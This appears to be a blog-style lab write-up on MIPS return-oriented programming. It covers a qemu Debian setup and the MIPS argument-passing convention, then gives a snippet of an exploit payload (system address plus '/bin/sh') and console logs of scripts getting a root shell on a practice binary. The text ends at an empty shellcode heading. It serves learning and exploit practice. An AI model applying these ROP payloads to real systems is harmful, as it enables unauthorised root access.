## Build Environment
Using qemu to set up your mips-arch system. Download the files [here](https://people.debian.org/~aurel32/qemu/mips/).
```
qemu-system-mips -m 512M -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -redir tcp:22::22 -device e1000,netdev=qnet0 -netdev user,id=qnet0,net=192.168.76.0/24,dhcpstart=192.168.76.9
```

## ROP
Ropping in every architecture the first thing you must be clear is the detail of function call. The first 4 arguments are saved by $a0-$a3 and others are stored in stack.
```
Suppose the 6 arguments are in s0-s5:
move $a0, $s0    #  and 0($fp) is reserved for this on the stack
move $a1, $s1    #  and 4($fp) is reserved for this on the stack
move $a2, $s2    # and 8($fp)...
move $a3, $s3    # and 12($fp)...
sw $s4, 16($fp)  # store 5th argument in the stack!!! Always at this location.
sw $s5, 20($fp)  # store 6th argument in the stack, always at this location.
```
As for the return value, v0 holds it. If the it's 64bit: v0 for high 32bit, v1 for low 32bit.
The same as arm-arch, the register fp sometimes is not pushed into stack. 
So in arm and mips arch, the stack frame is not necessary sometimes and you must see the assemble code to make sure. But in most of the time, it's normal, which means it will be pushed into stack.

Some details you can see [this](https://www.cs.umb.edu/cs641/MIPscallconvention.html).

You'd better call sleep(1) after you send "/bin/sh", although I don't know the reason~ And I knew it by debugging.
```
......
p.writeline(b32(system_addr) + "/bin/sh\x00")
raw_input('g0')
##system('/bin/sh')
......
```
And you can get a shell by remote attacking or local attacking:
```
➜  mips_exp python rop.py
[+] Connecting to localhost on port 22: Done
[!] Couldn't check security settings on 'localhost'
[+] Connecting to localhost:10000 via SSH to localhost: Done
[*] '/home/w0lfzhang/Desktop/mips_exp/rop'
    Arch:     mips-32-big
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[*] '/home/w0lfzhang/Desktop/mips_exp/libc.so.6'
    Arch:     mips-32-big
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
g0
[+] write_addr: 0x77f21cf8
[+] system_addr: 0x77ef2480
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
```
```
root@debian-mips:~/mips_exp# python rop_zio.py 
Welcome to mips ROP!
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@�aaaaaaaaaaaaaaaaaaaaaaaaaaaa��@paaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@p
w��[+] write_addr: 0x77f21cf8
[+] system_addr: 0x77e79da0
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@�aaaaaaaaaaaaaaaaaaaaaaaaaaaa�A   0d@paaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@p
w睠/bin/sh
g0
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@�aaaaaaaaaaaaaaaaaaaaaaaaaaaaA 0A 4@p
id
uid=0(root) gid=0(root) groups=0(root)
```
The reason I write the exploit script is that it's convenient to debug the program in the virtual machine and I can't install pwntools in mips-arch linux.

## Shellcode